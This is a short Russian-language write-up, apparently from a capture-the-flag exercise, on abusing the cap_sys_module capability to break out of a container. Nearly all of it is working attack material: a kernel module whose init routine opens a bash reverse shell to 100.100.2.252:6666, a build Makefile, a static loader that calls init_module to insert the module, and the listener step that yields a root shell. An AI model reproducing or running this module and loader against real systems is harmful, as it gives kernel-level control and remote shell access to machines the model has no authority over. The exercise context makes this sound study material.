Подключается к системе и изучаем разрешения

```
capsh --print | grep Current:

Current: 
cap_chown,
cap_dac_override,
cap_fowner,
cap_fsetid,
cap_kill,
cap_setgid,
cap_setuid,
cap_setpcap,
cap_net_bind_service,
cap_net_raw,
cap_sys_module,
cap_sys_chroot,
cap_mknod,
cap_audit_write,
cap_setfcap=ep
```
Опаснее всего cap_sys_module

Создаем файл rev-shell.c 
```
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/string.h>

static int __init revshell_init(void) {
    char *argv[] = {
        "/bin/bash",
        "-c",
        "bash -i >& /dev/tcp/100.100.2.252/6666 0>&1",
        NULL
    };
    char *envp[] = {
        "HOME=/root",
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    printk(KERN_INFO "Attempting to spawn reverse shell\n");
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

module_init(revshell_init);
MODULE_LICENSE("GPL");
```

Также потребуется добавить заголовки чтобы создать модуль ядра
```
Добавляем репозиторий Ubuntu (где есть нужные заголовки)
echo "deb http://archive.ubuntu.com/ubuntu focal-updates main" | sudo tee /etc/apt/sources.list.d/focal-updates.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32
sudo apt update
sudo apt install -y linux-headers-5.4.0-216-generi
```

Создаем Makefile для компиляции шелла
```
 В Makefile явно указываем путь к заголовкам
nano Makefile
obj-m += rev-shell.o
all:
        make -C /usr/src/linux-headers-5.4.0-216-generic M=$(PWD) modules
clean:
        make -C /usr/src/linux-headers-5.4.0-216-generic M=$(PWD) clean

make
```

с помощью wget передает на тачку модуль ядра

С помощью команды insmod /tmp/exploit.ko пытаемся запустить его и получаем ошибку

создаем лоадер, который будет подгружать модуль

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char **argv) {
    int fd;
    void *module;
    long size;

    if (argc != 2) {
        printf("Usage: %s <module.ko>\n", argv[0]);
        return 1;
    }

    fd = open(argv[1], O_RDONLY);
    size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    module = malloc(size);
    read(fd, module, size);
    close(fd);

    if (syscall(__NR_init_module, module, size, "") != 0) {
        perror("init_module");
        return 1;
    }

    printf("Модуль воткнулся!\n");
    return 0;
}

gcc -static loader.c -o loader
```

на основной машине запускаем слушателя 
Loader также закидываем на тачку, запускаем ./loader rev-shell.ko => получаем шелл и флаг